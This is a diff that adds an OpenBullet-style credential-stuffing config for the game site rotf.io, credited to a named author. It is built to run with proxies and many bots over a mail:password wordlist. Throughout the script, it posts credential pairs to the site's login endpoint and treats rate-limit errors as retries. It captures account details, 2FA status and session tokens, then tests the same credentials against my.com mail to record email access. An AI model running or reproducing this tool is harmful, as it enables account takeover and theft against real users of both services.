@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "Rotf.io",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T08:58:55.8636801-07:00",
+  "AdditionalInfo": "NAME | ACCOUNTID | CREDITS | FAME | LEGION | RANK | TOTALFAME | BESTFAME | IS2FA | TOKEN | EMAIL ACCESS",
+  "Author": "By Classic White#0001",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#URL REQUEST POST "https://ae.rotf.io/account/verify?g=<USER>" 
+  CONTENT "ignore=631031&gameClientVersion=X3%2E52&guid=<USER>&2fa=&cacheBust=428357&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: rotf.io" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#LOGIN_CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<Error>Bad Login</Error>" 
+    KEY "<Error>Bad 2fa pin</Error>" 
+  KEYCHAIN Success OR 
+    KEY "<Account>" 
+  KEYCHAIN Retry OR 
+    KEY "<Error>Rate limit exceeded</Error>" 
+    KEY "<Error>Internal server error</Error>" 
+
+#Name PARSE "<SOURCE>" LR "<Name>" "</Name>" CreateEmpty=FALSE -> CAP "NAME" 
+
+#AccountId PARSE "<SOURCE>" LR "<AccountId>" "</AccountId>" CreateEmpty=FALSE -> CAP "ACCOUNTID" 
+
+#Credits PARSE "<SOURCE>" LR "<Credits>" "</Credits>" CreateEmpty=FALSE -> CAP "CREDITS" 
+
+#Fame PARSE "<SOURCE>" LR "<Fame>" "</Fame>" CreateEmpty=FALSE -> CAP "FAME" 
+
+#Legion PARSE "<SOURCE>" LR "<LegionPoints>" "</LegionPoints>" CreateEmpty=FALSE -> CAP "LEGIONPOINTS" 
+
+#Rank PARSE "<SOURCE>" LR "<Rank>" "</Rank>" CreateEmpty=FALSE -> CAP "RANK" 
+
+#TotalFame PARSE "<SOURCE>" LR "<TotalFame>" "</TotalFame>" CreateEmpty=FALSE -> CAP "TOTALFAME" 
+
+#BestFame PARSE "<SOURCE>" LR "<BestFame>" "</BestFame>" CreateEmpty=FALSE -> CAP "BESTFAME" 
+
+#Is2fa PARSE "<SOURCE>" LR "<Is2faEnabled>" "</Is2faEnabled>" CreateEmpty=FALSE -> CAP "IS2FA" 
+
+#Token PARSE "<SOURCE>" LR "<Token>" "</Token>" CreateEmpty=FALSE -> CAP "TOKEN" 
+
+#Email_Access_1 REQUEST GET "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=<USER>&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=<PASS>&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "UserAgent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+  HEADER "ContentType: application/x-www-form-urlencoded" 
+
+#Email_Access_2 PARSE "<SOURCE>" LR "[\"AjaxResponse\", \"OK\", \"" "\"]" CreateEmpty=FALSE -> VAR "ACCESS" 
+
+#Email_Access_False FUNCTION Replace "Ok=0" "False" "<ACCESS>" -> CAP "Email Access" 
+
+#Email_Access_True FUNCTION Replace "Ok=1" "True" "<ACCESS>" -> CAP "Email Access" 
+
